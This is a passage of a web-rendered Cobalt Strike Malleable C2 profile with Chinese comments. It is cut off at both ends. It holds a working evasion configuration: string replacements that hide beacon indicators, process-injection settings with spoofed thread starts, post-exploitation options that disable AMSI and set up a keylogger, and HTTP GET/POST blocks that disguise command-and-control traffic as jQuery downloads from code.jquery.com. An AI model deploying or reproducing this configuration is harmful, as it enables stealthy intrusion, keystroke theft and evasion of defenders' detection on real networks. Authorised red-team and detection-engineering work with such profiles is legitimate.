class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;IsWow64Process&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;HTTP/1.1 200 OK&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack memory was corrupted&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;kernel32&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;beacon.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;KERNEL32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;ADVAPI32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;WININET.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;WS2_32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;DNSAPI.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Secur32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualProtectEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualProtect&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualAllocEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualAlloc&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualFree&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualQuery&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;RtlVirtualUnwind&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;sAlloc&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlsFree&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlsGetValue&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlsSetValue&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;InitializeCriticalSectionEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateSemaphoreExW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetThreadStackGuarantee&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateThreadpoolTimer&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetThreadpoolTimer&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;WaitForThreadpoolTimerCallbacks&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CloseThreadpoolTimer&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateThreadpoolWait&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetThreadpoolWait&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CloseThreadpoolWait&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlushProcessWriteBuffers&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FreeLibraryWhenCallbackReturns&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetCurrentProcessorNumber&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetLogicalProcessorInformation&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateSymbolicLinkW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetDefaultDllDirectories&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;EnumSystemLocalesEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CompareStringEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetDateFormatEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetLocaleInfoEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetTimeFormatEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetUserDefaultLocaleName&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;IsValidLocaleName&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;LCMapStringEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetCurrentPackageId&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;UNICODE&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;UTF-8&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;UTF-16LE&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;MessageBoxW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetActiveWindow&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetLastActivePopup&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetUserObjectInformationW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetProcessWindowStation&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Sunday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Monday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Tuesday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Wednesday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Thursday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Friday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Saturday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;January&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;February&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;March&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;April&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;June&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;July&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;August&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;September&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;October&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;November&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;December&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;MM/dd/yy&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack memory around _alloca was corrupted&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Unknown Runtime Check Error&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Unknown Filename&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Unknown Module Name&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Run-Time Check Failure #%d - %s&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack corrupted near unknown variable&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack pointer corruption&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Cast to smaller type causing loss of data&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack memory corruption&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Local variable used before initialization&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack around _alloca corrupted&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;RegOpenKeyExW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;egQueryValueExW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;RegCloseKey&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;LibTomMath&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Wow64DisableWow64FsRedirection&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Wow64RevertWow64FsRedirection&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Kerberos&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        append <span class="string">&quot;\x90\x90\x90&quot;</span>; # NOP, NOP!</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta"># stringw <span class="string">&quot;ATTACKTEAMFAMILY&quot;</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># è¿›ç¨‹æ³¨å…¥ç›¸å…³</span><br><span class="line">process-inject &#123;</span><br><span class="line">    <span class="meta"># set remote memory allocation technique</span></span><br><span class="line">    <span class="built_in">set</span> allocator <span class="string">&quot;VirtualAllocEx&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta"># shape the content and properties of what we will inject</span></span><br><span class="line">    <span class="built_in">set</span> min_alloc <span class="string">&quot;7814&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> userwx    <span class="string">&quot;false&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> startrwx <span class="string">&quot;false&quot;</span>;</span><br><span class="line"></span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">        prepend <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>; # NOP, NOP!</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>; # NOP, NOP!</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta"># specify how we execute code in the remote process</span></span><br><span class="line">    execute &#123;</span><br><span class="line">        CreateThread <span class="string">&quot;ntdll.dll!RtlUserThreadStart+0x2285&quot;</span>;</span><br><span class="line">        NtQueueApcThread-s;</span><br><span class="line">        SetThreadContext;</span><br><span class="line">        CreateRemoteThread;</span><br><span class="line">        CreateRemoteThread <span class="string">&quot;kernel32.dll!LoadLibraryA+0x1000&quot;</span>;</span><br><span class="line">        RtlCreateUserThread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">post-ex &#123; </span><br><span class="line">    # æ§åˆ¶åæ¸—é€æ¨¡å—ç‰¹å®šè¿›ç¨‹æ³¨å…¥è¿‡ç¨‹ä¾‹å¦‚hashdumpçš„å…·ä½“ç»†èŠ‚</span><br><span class="line">    <span class="meta"># control the temporary process we spawn to</span></span><br><span class="line">    <span class="built_in">set</span> spawnto_x86 <span class="string">&quot;%windir%\\syswow64\\svchost.exe&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> spawnto_x64 <span class="string">&quot;%windir%\\sysnative\\svchost.exe&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># change the permissions and content of our post-ex DLLs</span></span><br><span class="line">    <span class="built_in">set</span> obfuscate <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># change our post-ex output named pipe names...</span></span><br><span class="line">    <span class="built_in">set</span> pipename <span class="string">&quot;srvsvc-1-5-5-0####&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># pass key function pointers from Beacon to its child jobs</span></span><br><span class="line">    <span class="built_in">set</span> smartinject <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># allows multi-threaded post-ex DLLs to spawn threads with a spoofed start address</span></span><br><span class="line">    <span class="meta"># set thread_hint <span class="string">&quot;module!function+0x##&quot;</span>;</span></span><br><span class="line">    <span class="meta"># disable AMSI in powerpick, execute-assembly, and psinject</span></span><br><span class="line">    <span class="built_in">set</span> amsi_disable <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># control the method used to log keystrokes </span></span><br><span class="line">    <span class="built_in">set</span> keylogger <span class="string">&quot;SetWindowsHookEx&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">    # å¢åŠ headers</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># set <span class="string">&quot;true&quot;</span> <span class="keyword">if</span> teamserver is behind redirector</span></span><br><span class="line">    <span class="built_in">set</span> trust_x_forwarded_for <span class="string">&quot;false&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    # é˜»æ­¢ä¸æ­£å¸¸çš„useragent,å¦‚ï¼šcurl*,lynx*,wget*</span><br><span class="line">    <span class="built_in">set</span> block_useragents <span class="string">&quot;curl*,lynx*,wget*&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/jquery-3.3.1.min.js&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> verb <span class="string">&quot;GET&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        <span class="meta">#header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;code.jquery.com&quot;</span>;</span></span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            prepend <span class="string">&quot;__cfduid=&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line"></span><br><span class="line">        output &#123;   </span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            ## The javascript was changed.  Double quotes and backslashes were escaped to properly <span class="title function_">render</span> <span class="params">(Refer to Tips <span class="keyword">for</span> Profile Parameter Values)</span></span><br><span class="line">            # 2nd Line            </span><br><span class="line">            prepend &quot;!<span class="title function_">function</span><span class="params">(e,t)</span>&#123;\<span class="string">&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            # <span class="number">1</span>st Line</span><br><span class="line">            prepend <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    # ä¸»è¦ç”¨äºä¼ è¾“ä»»åŠ¡æ‰§è¡Œç»“æœçš„å›æ˜¾</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/jquery-3.3.2.min.js&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> verb <span class="string">&quot;POST&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        <span class="meta">#header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;code.jquery.com&quot;</span>;</span></span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">       </span><br><span class="line">        id &#123;</span><br><span class="line">            mask;       </span><br><span class="line">            base64url;</span><br><span class="line">            parameter <span class="string">&quot;__cfduid&quot;</span>;            </span><br><span class="line">        &#125;</span><br><span class="line">              </span><br><span class="line">        output &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            ## The javascript was changed.  Double quotes and backslashes were escaped to properly <span class="title function_">render</span> <span class="params">(Refer to Tips <span class="keyword">for</span> Profile Parameter Values)</span></span><br><span class="line">            # 2nd Line            </span><br><span class="line">            prepend &quot;!<span class="title function_">function</span><span class="params">(e,t)</span>&#123;\<span class="string">&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new 